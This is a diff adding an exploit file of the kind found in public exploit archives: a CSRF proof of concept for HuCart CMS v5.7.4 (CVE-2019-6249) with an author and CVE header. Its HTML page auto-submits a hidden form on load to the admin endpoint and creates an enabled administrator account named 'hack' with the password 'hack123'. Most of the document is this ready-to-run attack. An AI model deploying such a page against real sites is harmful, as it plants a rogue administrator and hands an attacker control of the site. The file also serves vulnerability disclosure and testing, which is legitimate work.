@@ -1,0 +1,48 @@
+<!--
+# Exploit Title: Hucart cms v5.7.4 CSRF vulnerability add administrator account
+# Date: 2019-01-13
+# Exploit Author: AllenChen（520allen@gmail.com）
+# Vendor Homepage: http://www.hucart.com/
+# Software Link: http://www.hucart.com/
+# Version: v5.7.4
+# CVE : CVE-2019-6249
+ 
+An issue was discovered in HuCart v5.7.4. There is a CSRF vulnerability that can add an admin account via /adminsys/index.php?load=admins&act=edit_info&act_type=add.（References：http://www.iwantacve.cn/index.php/archives/109/）
+
+After the administrator logged in, open the csrf exp page.
+-->
+
+
+<html><body>
+<script type="text/javascript">
+function post(url,fields)
+{
+var p = document.createElement("form");
+p.action = url;
+p.innerHTML = fields;
+p.target = "_self";
+p.method = "post";
+document.body.appendChild(p);
+p.submit();
+}
+function csrf_hack()
+{
+var fields;
+
+
+fields += "<input type='hidden' name='adm_user' value='hack' />";
+fields += "<input type='hidden' name='adm_email' value='admin@hack.com' />";  
+fields += "<input type='hidden' name='adm_mobile' value='13888888888' />";  
+fields += "<input type='hidden' name='adm_pwd' value='hack123' />";  
+fields += "<input type='hidden' name='re_adm_pwd' value='hack123' />";  
+fields += "<input type='hidden' name='adm_enabled' value='1' />";  
+fields += "<input type='hidden' name='act_type' value='add' />";  
+fields += "<input type='hidden' name='adm_id' value='' />";  
+
+
+var url = "http://localhost/hucart_cn/adminsys/index.php?load=admins&act=edit_info&act_type=add";
+post(url,fields);
+}
+window.onload = function() { csrf_hack();}
+</script>
+</body></html>
